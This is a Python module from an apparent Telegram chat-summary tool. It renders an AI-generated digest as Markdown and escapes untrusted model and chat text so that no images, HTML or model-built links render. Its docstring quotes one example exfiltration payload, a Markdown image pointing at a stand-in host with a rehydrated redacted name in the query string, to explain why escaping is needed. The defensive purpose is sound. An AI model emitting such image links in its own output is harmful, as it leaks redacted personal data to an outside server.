"""Markdown digest with message citations and a coverage appendix.

Everything a model wrote, and everything taken from the chat itself (such as the group name), is untrusted.
It is escaped so it renders as plain text: no images, no HTML, no links the model built. A Markdown viewer
fetches images on open, so an unescaped `![x](https://host/?n=<rehydrated name>)` would leak what redaction
hid. URLs that occur in the summarized messages stay clickable; any other URL is shown as a code span.
Citation links are generated here, never taken from model output.
"""

from __future__ import annotations

import re
from collections import Counter
from dataclasses import dataclass
from datetime import datetime

from tg_summary.enrich import Enrichment, Entry
from tg_summary.llm import CallStats
from tg_summary.models import Chat, Message
from tg_summary.redact import find_urls
from tg_summary.segment import media_placeholder
from tg_summary.summarize import Cited, Outcome

MAX_CITES = 5

# Inline Markdown/HTML syntax. Backslash-escaping any ASCII punctuation is valid CommonMark.
_SPECIAL = re.compile(r"([\\`*_\[\]<>!|~&#])")
# Block syntax that only matters at the start of a line: list items, numbered lists.
_LEADING = re.compile(r"^(\s*)([-+]|\d+[.)])")


@dataclass
class Coverage:
    messages: list[Message]
    service_counts: dict[str, int]
    model: str
    endpoint: str
    external: bool
    stats: CallStats
    redactions: Counter[str]
    enrichment: Enrichment | None = None  # None when the media and link stage did not run
    media_appendix: bool = True  # list each processed item with its description, transcript or summary
    bangers: int = 0  # how many most-reacted messages to list; 0 leaves the section out
    bangers_min_reactions: int = 3


def render(chat: Chat, outcome: Outcome, cov: Coverage) -> str:
    d = outcome.digest
    safe = _Inert(cov.messages)
    first, last = cov.messages[0].date.astimezone(), cov.messages[-1].date.astimezone()
    people = len({m.sender_id or m.sender for m in cov.messages})
    out = [
        f"# {safe(chat.name)}: {first:%Y-%m-%d} to {last:%Y-%m-%d}",
        "",
        (
            f"{len(cov.messages)} messages from {people} people. Generated {datetime.now():%Y-%m-%d %H:%M} "
            f"with `{cov.model}` on `{cov.endpoint}`."
        ),
        "",
        "## Overview",
        "",
        safe(d.overview),
        "",
        "## Themes",
    ]
    for theme in d.themes:
        out += ["", f"### {safe(theme.title)}", "", safe(theme.summary)]
        if theme.key_points:
            out.append("")
            out += _items(chat, theme.key_points, safe)
        out += ["", f"Sources: {_cite(chat, theme.msg_ids)}"]

    for title, items in (
        ("Decisions", d.decisions),
        ("Open questions", d.open_questions),
        ("Action items", d.action_items),
        ("Notable links", d.links),
    ):
        if items:
            out += ["", f"## {title}", "", *_items(chat, items, safe)]

    if cov.bangers and (top := _top_reacted(cov.messages, cov.bangers, cov.bangers_min_reactions)):
        out += ["", "## Bangers", "", *_bangers(chat, top, cov.enrichment, safe)]

    if cov.media_appendix and cov.enrichment is not None and cov.enrichment.entries:
        out += ["", "## Appendix: all media and links", "", *_media_appendix(chat, cov.enrichment.entries, safe)]

    out += ["", "## Coverage", "", *_coverage(outcome, cov, safe)]
    return "\n".join(out) + "\n"


class _Inert:
    """Escapes untrusted text; keeps only URLs that the summarized messages actually contain clickable."""

    def __init__(self, messages: list[Message]):
        self._known = {_absolute(url) for m in messages for _, _, url in find_urls(m.text)}

    def __call__(self, text: str) -> str:
        text = " ".join(text.split())  # model text never gets to start its own block
        out, pos = [], 0
        for start, end, url in find_urls(text):
            out.append(_escape(text[pos:start]))
            absolute = _absolute(url)
            out.append(f"<{absolute}>" if absolute in self._known else f"`{url.replace('`', '')}`")
            pos = end
        out.append(_escape(text[pos:]))
        return _LEADING.sub(r"\1\\\2", "".join(out))


def _escape(text: str) -> str:
    return _SPECIAL.sub(r"\\\1", text)


def _absolute(url: str) -> str:
    return url if re.match(r"https?://", url, re.IGNORECASE) else "https://" + url


def _items(chat: Chat, items: list[Cited], safe: _Inert) -> list[str]:
    return [f"- {safe(i.text)} {_cite(chat, i.msg_ids)}" for i in items]


def _cite(chat: Chat, ids: list[int]) -> str:
    shown = sorted(ids)[:MAX_CITES]
    parts = [f"[#{i}]({link})" if (link := chat.message_link(i)) else f"#{i}" for i in shown]
    if len(ids) > MAX_CITES:
        parts.append(f"+{len(ids) - MAX_CITES} more")
    return "(" + ", ".join(parts) + ")" if parts else ""


BANGER_CHARS = 280


def _top_reacted(messages: list[Message], n: int, minimum: int) -> list[Message]:
    """The `n` most-reacted messages with at least `minimum` reactions; ties go to the earlier message."""
    ranked = sorted((m for m in messages if m.reaction_total >= minimum), key=lambda m: (-m.reaction_total, m.date))
    return ranked[:n]


def _bangers(chat: Chat, top: list[Message], enrichment: Enrichment | None, safe: _Inert) -> list[str]:
    """Straight from the chat: reaction counts, sender, an excerpt (escaped) and a link to the message."""
    lines = []
    for m in top:
        derived = enrichment.derived.get(m.id) if enrichment else None
        media = ""
        if m.media is not None:
            described = derived.media if derived else None
            media = f"[{m.media.kind.replace('_', ' ')}: {described}]" if described else media_placeholder(m.media)
        text = " ".join(p for p in (m.text, media) if p)
        if len(text) > BANGER_CHARS:
            text = text[: BANGER_CHARS - 1] + "…"
        counts = " ".join(f"{label} {n}" for label, n in sorted(m.reactions, key=lambda r: -r[1]))
        when = m.date.astimezone()
        lines.append(
            f"- **{m.reaction_total}** ({safe(counts)}) {safe(m.sender or 'Unknown')}, {when:%b %-d %H:%M}: "
            f"{safe(text)} {_cite(chat, [m.id])}"
        )
    return lines


def _coverage(outcome: Outcome, cov: Coverage, safe: _Inert) -> list[str]:
    media = Counter(m.media.kind for m in cov.messages if m.media)
    s = cov.stats
    rows = [
        ("Messages summarized", len(cov.messages)),
        ("Chunks", outcome.chunks),
        ("Merge rounds", outcome.merge_rounds),
        ("Model calls (cache hits)", f"{s.calls} ({s.cache_hits})"),
        ("Repair requests", s.repairs),
        ("Retries after server or connection errors", s.transient_retries),
        ("Chunk splits (notes too long)", outcome.splits),
        ("Invalid citations dropped", outcome.dropped_citations),
        ("Uncited items dropped", outcome.dropped_items),
        ("List entries over a cap trimmed", outcome.trimmed_entries),
        ("Calls to external endpoints", s.external_calls + (cov.enrichment.external_calls if cov.enrichment else 0)),
    ]
    lines = ["| | Count |", "|---|---:|", *(f"| {k} | {v} |" for k, v in rows)]
    if cov.enrichment is not None:
        lines += ["", *_enrichment(cov.enrichment, safe)]
    elif media:
        lines += [
            "",
            (
                "Media was included as placeholders only (type, duration, file name, sticker emoji, poll text); "
                "nothing was transcribed or described."
            ),
            "",
            "| Media | Count |",
            "|---|---:|",
            *(f"| {k} | {v} |" for k, v in media.most_common()),
        ]
    if cov.service_counts:
        lines += [
            "",
            "Service events (not summarized): "
            + safe(", ".join(f"{k} {v}" for k, v in sorted(cov.service_counts.items(), key=lambda kv: -kv[1]))),
        ]
    if cov.external:
        lines += [
            "",
            "Redacted before sending: "
            + (", ".join(f"{k} {v}" for k, v in cov.redactions.most_common()) or "nothing detected")
            + ". Detection is imperfect: combinations of ordinary details can still identify people.",
        ]
        unmatched = s.unmatched_tokens + (cov.enrichment.unmatched_tokens if cov.enrichment else [])
        if unmatched:
            uniq = sorted(set(unmatched))
            lines.append(
                "Placeholders in responses that were not part of the request, left as-is: " + safe(", ".join(uniq[:20]))
            )
    return lines


_STATUSES = ("done", "opened", "unverified", "failed", "over_limit", "missing", "skipped")


def _enrichment(e: Enrichment, safe: _Inert) -> list[str]:
    """Items of the media and link stage by kind and status. Error codes come from providers, so are escaped."""
    counts = e.counts()
    kinds = list(dict.fromkeys(k for k, _ in counts))
    calls = ", ".join(f"{role} {n}" for role, n in sorted(e.calls.items())) or "none"
    lines = [
        (
            f"Media and links: requests this run: {calls}; reused from earlier runs: {e.cache_hits}. Items that were "
            "not done, opened or unverified kept their placeholder."
        ),
        "",
        "| Item | " + " | ".join(_STATUSES) + " |",
        "|---|" + "---:|" * len(_STATUSES),
        *(f"| {safe(k)} | " + " | ".join(str(counts.get((k, s), 0)) for s in _STATUSES) + " |" for k in kinds),
    ]
    if errors := e.errors():
        lines += ["", "Failed: " + safe(", ".join(f"{k} {v}" for k, v in errors.most_common()))]
    return lines


def _media_appendix(chat: Chat, entries: list[Entry], safe: _Inert) -> list[str]:
    """One line per photo, video, voice note or link. All text came from models or the chat, so it is escaped;
    citation links are generated here."""
    lines = []
    for e in entries:
        cite = _cite(chat, list(e.msg_ids))
        if e.kind == "link":
            url = safe(e.url or "")
            if e.text:
                note = " (could not be confirmed as opened)" if e.status == "unverified" else ""
                lines.append(f"- {url}{note}: {safe(e.text)} {cite}")
            else:
                lines.append(f"- {url}: not read ({safe(e.error or e.status)}) {cite}")
            continue
        parts = [safe(e.text)] if e.text else []
        if e.transcript is not None:
            parts.append(f'Transcript: "{safe(e.transcript)}"' if e.transcript else "No speech.")
        body = " ".join(parts) or f"not processed ({safe(e.error or e.status)})"
        lines.append(f"- **{e.kind.replace('_', ' ')}** {cite}: {body}")
    return lines
